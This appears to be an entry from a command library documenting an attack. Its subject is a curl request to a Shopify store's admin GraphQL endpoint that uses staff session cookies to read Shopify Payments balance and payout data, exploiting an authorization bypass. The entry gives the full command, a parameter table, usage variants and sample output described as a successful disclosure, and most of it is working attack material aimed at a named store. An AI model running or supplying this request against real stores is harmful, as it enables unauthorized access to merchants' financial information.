---
id: cmd-shopify-graphql-query-001
name: shopify-graphql-payments-query
type: command
executor: bash
data: >-
  curl -X POST https://vir444.myshopify.com/admin/api/graphql -H "Content-Type:
  application/json" -H "x-shopify-web-force-proxy: 1" -H "Origin:
  https://vir444.myshopify.com" -b "cookies" -d
  '{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query
  HomeIndex($localTime: DateTime!) { shop { shopifyPaymentsAccount { balance {
  ... on MoneyV2 { amount currencyCode } } payouts(first: 2, reverse: true) {
  edges { ... on ShopifyPaymentsPayoutEdge { node { gross { amount currencyCode
  } id issuedAt status } } } } } } } }"}'
output: >-
  {"data": {"shop": {"betaSlice": true, "__typename": "Shop", "features":
  {"__typename": "ShopFeatures", "storefront": true}, "shopifyPaymentsAccount":
  {"__typename": "ShopifyPaymentsAccount", "payouts": {"__typename":
  "ShopifyPaymentsPayoutConnection", "edges": []}, "balance": []},
  "betaOnboarding": true, "id": "gid://shopify/Shop/5282726001", "email":
  "a@gmail.com"}}}
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.727Z'
platforms:
  - Web
  - Linux
  - macOS
  - Windows
tags:
  - graphql
  - shopify
  - authorization-bypass
verified: false
validated: true
submitted: true
---

# shopify-graphql-payments-query

## Command

```bash
curl -X POST https://vir444.myshopify.com/admin/api/graphql \
  -H "Content-Type: application/json" \
  -H "x-shopify-web-force-proxy: 1" \
  -H "Origin: https://vir444.myshopify.com" \
  -b "_shopify_s=...; ..." \
  -d '{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query HomeIndex($localTime: DateTime!) { shop { shopifyPaymentsAccount { balance { ... on MoneyV2 { amount currencyCode } } payouts(first: 2, reverse: true) { edges { ... on ShopifyPaymentsPayoutEdge { node { gross { amount currencyCode } id issuedAt status } } } } } } } }"}'
```

## Description

This curl command sends a modified GraphQL query to Shopify's admin API to retrieve sensitive Shopify Payments account details, exploiting an authorization bypass. It uses a staff session to access balance and payouts without permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for GraphQL request | Yes |
| `https://vir444.myshopify.com/admin/api/graphql` | Target endpoint; replace with store domain | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-H "x-shopify-web-force-proxy: 1"` | Shopify-specific header for proxying | Yes |
| `-H "Origin: https://vir444.myshopify.com"` | Origin header to mimic UI request | Yes |
| `-b "cookies"` | Auth cookies from staff session | Yes |
| `-d '{...}'` | JSON payload with query, variables, and operationName | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://store.myshopify.com/admin/api/graphql -H "Content-Type: application/json" -b "cookies" -d '{"query": "query { shop { name } }"}'
```

### Advanced Usage

```bash
curl -X POST https://store.myshopify.com/admin/api/graphql \
  -H "Content-Type: application/json" \
  -H "x-shopify-web-force-proxy: 1" \
  -b "cookies" \
  -d '{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"... full query ..."}'
```

## Expected Output

JSON response with data.shop.shopifyPaymentsAccount containing balance array (e.g., empty or with amounts/currencies) and payouts edges, indicating successful disclosure of financial details.

## Related

- [[Related Procedure: Exploit-GraphQL-for-Payments-Data]]
